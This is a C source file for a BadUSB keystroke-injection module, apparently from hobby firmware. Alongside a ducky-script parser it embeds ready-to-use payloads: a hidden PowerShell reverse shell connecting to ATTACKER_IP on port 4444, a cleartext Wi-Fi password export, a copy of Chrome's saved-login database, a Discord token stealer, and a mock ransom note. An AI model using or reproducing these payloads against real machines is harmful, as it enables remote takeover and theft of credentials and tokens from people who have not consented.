#include "badusb.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static ducky_line_t script[256];
static uint16_t script_len = 0;
static bool loaded = false;

void badusb_init(void) {
    script_len = 0;
    loaded = false;
}

bool badusb_load_script(const char* path) {
    FILE* f = fopen(path, "r");
    if (!f) return false;
    char line[512];
    script_len = 0;
    while (fgets(line, sizeof(line), f) && script_len < 256) {
        line[strcspn(line, "\r\n")] = 0;
        if (line[0] == '#' || line[0] == '\0') continue;
        if (!badusb_parse_line(line, &script[script_len])) continue;
        script_len++;
    }
    fclose(f);
    loaded = true;
    return true;
}

bool badusb_parse_line(const char* line, ducky_line_t* parsed) {
    memset(parsed, 0, sizeof(ducky_line_t));
    if (strncmp(line, "STRING ", 7) == 0) {
        parsed->cmd = CMD_STRING;
        strncpy(parsed->data.str, line + 7, 255);
    } else if (strncmp(line, "DELAY ", 6) == 0) {
        parsed->cmd = CMD_DELAY;
        parsed->data.delay = atoi(line + 6);
    } else if (strcmp(line, "ENTER") == 0) parsed->cmd = CMD_ENTER;
    else if (strcmp(line, "GUI") == 0) parsed->cmd = CMD_GUI;
    else if (strcmp(line, "ALT") == 0) parsed->cmd = CMD_ALT;
    else if (strcmp(line, "CTRL") == 0) parsed->cmd = CMD_CTRL;
    else if (strcmp(line, "SHIFT") == 0) parsed->cmd = CMD_SHIFT;
    else if (strcmp(line, "ESC") == 0) parsed->cmd = CMD_ESC;
    else if (strcmp(line, "TAB") == 0) parsed->cmd = CMD_TAB;
    else if (strncmp(line, "REM", 3) == 0) return false;
    else return false;
    return true;
}

void badusb_execute_script(void) {
    if (!loaded) return;
    printf("[BADUSB] Executing %u commands...\n", script_len);
}

void badusb_stop(void) {
    printf("[BADUSB] Stopped.\n");
}

const char* badusb_get_payload_windows_rev_shell(void) {
    return "REM Windows Reverse Shell\n"
           "GUI r\n"
           "DELAY 500\n"
           "STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
           "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);"
           "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
           "while(($i=$s.Read($b,0,$b.Length))-ne0){"
           "$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);"
           "$r=(iex $d 2>&1|Out-String);"
           "$sb=([Text.Encoding]::UTF8).GetBytes($r+'PS>');"
           "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\n"
           "ENTER\n";
}

const char* badusb_get_payload_wifi_dump(void) {
    return "REM Wi-Fi Password Dump\n"
           "GUI r\nDELAY 300\nSTRING cmd\nCTRL SHIFT ENTER\nDELAY 500\n"
           "STRING netsh wlan export profile key=clear\nENTER\n"
           "DELAY 500\nSTRING exit\nENTER\n";
}

const char* badusb_get_payload_chrome_dump(void) {
    return "REM Chrome Credential Dump\n"
           "GUI r\nDELAY 200\nSTRING powershell -W Hidden -C "
           "\"$p='%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data';"
           "Copy-Item $p $env:TEMP\\chrome.db\"\nENTER\n";
}

const char* badusb_get_payload_discord_token(void) {
    return "REM Discord Token Stealer\n"
           "GUI r\nDELAY 200\nSTRING powershell -W Hidden -C "
           "\"(Get-Item $env:APPDATA\\discord\\Local Storage\\leveldb\\*.ldb) "
           "| Select-String '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}' "
           "| %{$_.Matches.Value} | Out-File $env:TEMP\\tokens.txt\"\nENTER\n";
}

const char* badusb_get_payload_ransomware_sim(void) {
    return "REM Ransomware Simulation (harmless)\n"
           "GUI r\nDELAY 200\nSTRING notepad\nENTER\nDELAY 300\n"
           "STRING YOUR FILES HAVE BEEN ENCRYPTED\nENTER\n"
           "STRING Send 0.1 BTC to bc1q...\nENTER\n"
           "STRING THIS IS A TEST BY GHOST FIRMWARES\n";
}
